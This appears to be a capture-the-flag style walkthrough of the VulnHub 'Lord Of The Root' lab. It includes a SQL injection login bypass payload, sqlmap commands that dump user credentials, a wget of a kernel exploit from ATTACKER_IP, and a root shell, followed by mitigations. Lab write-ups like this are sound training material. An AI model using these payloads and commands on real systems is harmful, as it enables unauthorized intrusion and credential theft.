# 👑 Lord Of The Root — VulnHub Walkthrough

Exploited a SQL Injection vulnerability to bypass authentication, dumped database credentials using SQLMap, gained SSH access as a valid user, and escalated privileges to root via a local kernel exploit.

---

# 📌 Overview

This repository contains a complete walkthrough of compromising the **Lord Of The Root** machine from initial reconnaissance to full root access.

## ⚔ Attack Chain

- 🔓 Port Knocking
- 💉 SQL Injection Authentication Bypass
- 🗄 Database Enumeration
- 🔑 Credential Reuse
- 👑 Local Privilege Escalation

---

# 🛠 Tools Used

| Tool | Purpose |
|---|---|
| Nmap | Port Scanning & Service Detection |
| Knock | Port Knocking |
| FFUF | Directory Enumeration |
| Burp Suite | Request Interception & SQLi Testing |
| SQLMap | Automated SQL Injection Exploitation |
| Searchsploit | Privilege Escalation Research |
| GCC | Compile Local Exploit |
| SSH | Remote Access |

---

# 🔎 Reconnaissance

Initial scan was performed using Nmap:

```bash
nmap -sC -sV -p- 192.168.10.7
```

## 📸 Screenshot

![Nmap Scan](screenshots/nmap-scan.png)

### Result

```text
22/tcp open ssh
```

Attempted SSH access:

```bash
ssh 192.168.10.7
```

A hint saying:

```text
Easy as 1 2 3
```

was discovered.

---

# 🚪 Port Knocking

Used the Knock tool:

```bash
knock -v 192.168.10.7 1 2 3
```

Performed another Nmap scan:

```bash
nmap -p- 192.168.10.7
```

## 📸 Screenshot

![Port Knocking](screenshots/port-knocking.png)

### New Port Discovered

```text
1337/tcp open http
```

---

# 🌐 Web Enumeration

Accessed the web service:

```text
http://192.168.10.7:1337
```

Directory fuzzing using FFUF:

```bash
ffuf -u http://192.168.10.7:1337/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

## 📸 Screenshot

![FFUF Output](screenshots/ffuf-output.png)

A hidden file was discovered:

```text
404.html
```

---

# 🔐 Decoding Hidden Message

The page source contained a double Base64 encoded message.

Decoded using:

```bash
echo "ENCODED_TEXT" | base64 -d
```

## 📸 Screenshot

![Decoding Process](screenshots/decoding-process.png)

Hidden directory discovered:

```text
/978345210/index.php
```

---

# 🔑 Login Panel Discovery

Hidden login panel:

```text
http://192.168.10.7:1337/978345210/index.php
```

## 📸 Screenshot

![Login Panel](screenshots/login-panel.png)

---

# 💉 SQL Injection Authentication Bypass

Payload used:

```sql
' OR 1=1-- -
```

Authentication bypass was successful.

## 📸 Screenshot

![Burp SQLi](screenshots/burp-sqli.png)

---

# 🗄 Database Enumeration with SQLMap

Captured request saved as:

```text
root1.txt
```

Identify database:

```bash
sqlmap -r root1.txt --dbs
```

Extract tables:

```bash
sqlmap -r root1.txt -D webapp --tables
```

Dump credentials:

```bash
sqlmap -r root1.txt -D webapp -T users --dump
```

## 📸 Screenshot

![SQLMap Dump](screenshots/sqlmap-dump.png)

### Credentials Found

```text
Username: smeagol
Password: MyPreciousR00t
```

---

# 🖥 Initial Shell Access

SSH login:

```bash
ssh smeagol@192.168.10.7
```

## 📸 Screenshot

![SSH Access](screenshots/ssh-access.png)

---

# 🔍 System Enumeration

Gathered system information:

```bash
uname -a
```

```bash
lsb_release -a
```

### Result

```text
Ubuntu 14.04
```

---

# 👑 Privilege Escalation

Searched for local exploits:

```bash
searchsploit ubuntu 14.04
```

Exploit identified:

```text
39166.c
```

Transferred exploit:

```bash
wget http://ATTACKER_IP/39166.c
```

Compiled exploit:

```bash
gcc 39166.c -o exploit
```

Executed exploit:

```bash
./exploit
```

## 📸 Screenshot

![Privilege Escalation](screenshots/privilege-escalation.png)

---

# 💀 Root Access Achieved

Root shell successfully obtained.

```bash
root@LordOfTheRoot:/#
```

## 📸 Screenshot

![Root Shell](screenshots/root-shell.png)

---

# 🛡 Mitigation

- Disable unnecessary port knocking exposure
- Sanitize user inputs against SQL Injection
- Use parameterized queries
- Store passwords securely using strong hashing
- Keep Linux kernel updated
- Restrict sensitive files and hidden directories
- Implement Web Application Firewall (WAF)

---

# 🧠 Lessons Learned

This machine demonstrated:

- Real-world enumeration techniques
- Importance of hidden services
- SQL Injection exploitation workflow
- Credential harvesting
- Linux privilege escalation methodology
- Chaining multiple vulnerabilities for full compromise

---

# ⚠ Disclaimer

This walkthrough was created for educational purposes and authorized lab environments only.

---

👨‍💻 Author
salik921
💻 Penetration Testing Enthusiast
🔥 Red Teaming Learner
🛡 Web Exploitation & Privilege Escalation
### ⭐ If you found this walkthrough useful, give this repository a star ⭐


